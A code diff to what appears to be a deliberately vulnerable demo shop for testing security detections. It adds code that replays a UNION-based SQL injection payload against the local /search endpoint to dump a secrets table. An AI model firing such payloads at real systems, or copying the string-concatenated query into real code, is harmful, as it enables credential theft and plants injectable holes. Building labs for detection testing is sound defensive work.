@@ -75,6 +75,10 @@ public class ShopController {
           defaultValue = "' UNION SELECT id,k,v,v FROM secrets--"
       ) String payload
   ) throws Exception {
+    // Drive the real shop path (GET /search?q=…) so HTTP / WAF / runtime sensors see the
+    // same request shape as a manual search — not only an internal /api/demo/* call.
+    String shopSearchUrl = replayShopSearch(payload);
+
     List<Map<String, String>> rows = catalog.searchVulnerable(payload);
     boolean dumpedSecrets = rows.stream().anyMatch(r ->
         "admin_password".equals(r.get("name"))
@@ -94,19 +98,55 @@ public class ShopController {
     out.put("exploited", hit || dumpedSecrets || payload.toLowerCase(Locale.ROOT).contains("union"));
     out.put("cve", "CWE-89");
     out.put("name", "SQL Injection");
+    out.put("http_replay", shopSearchUrl);
     out.put("sql", catalog.lastSql(payload));
     out.put("payload", payload);
     out.put("rows", rows);
     out.put("db_path", catalog.getDbPath().toString());
     out.put("narrative",
-        "String-concatenated SQLite query on /search — UNION SELECT dumps the secrets table "
-            + "(admin password / internal notes). Classic initial access for Critical VM Compromise.");
+        "PoC replays GET /search?q=<payload> (same as the shop UI), then dumps secrets via "
+            + "string-concatenated SQLite — so detections match manual search traffic.");
     out.put("signals", List.of(
+        "HTTP GET /search with SQLi in q=",
         "Database query with attacker-controlled SQL",
         "Secret/table dump via UNION",
         "App process reading SQLite DB file"
     ));
     return out;
+  }
+
+  /** Same HTTP shape as typing SQLi into the shop search box. */
+  private String replayShopSearch(String payload) {
+    int port = 8080;
+    try {
+      String envPort = System.getenv("SERVER_PORT");
+      if (envPort != null && !envPort.isBlank()) {
+        port = Integer.parseInt(envPort.trim());
+      } else {
+        String prop = System.getProperty("server.port");
+        if (prop != null && !prop.isBlank()) {
+          port = Integer.parseInt(prop.trim());
+        }
+      }
+    } catch (Exception ignored) {
+    }
+    String url = "http://127.0.0.1:" + port + "/search?q="
+        + java.net.URLEncoder.encode(payload, StandardCharsets.UTF_8);
+    try {
+      java.net.HttpURLConnection conn = (java.net.HttpURLConnection) java.net.URI.create(url)
+          .toURL()
+          .openConnection();
+      conn.setRequestMethod("GET");
+      conn.setConnectTimeout(3000);
+      conn.setReadTimeout(8000);
+      conn.setRequestProperty("User-Agent", "TraditionalJay-PoC/1.0 (shop-search-replay)");
+      conn.setRequestProperty("Accept", "text/html");
+      conn.getResponseCode();
+      conn.disconnect();
+    } catch (Exception e) {
+      log.warn("Shop search replay failed (SQLi still runs in-process): " + e.getMessage());
+    }
+    return url;
   }
 
   @PostMapping("/api/demo/log4shell")
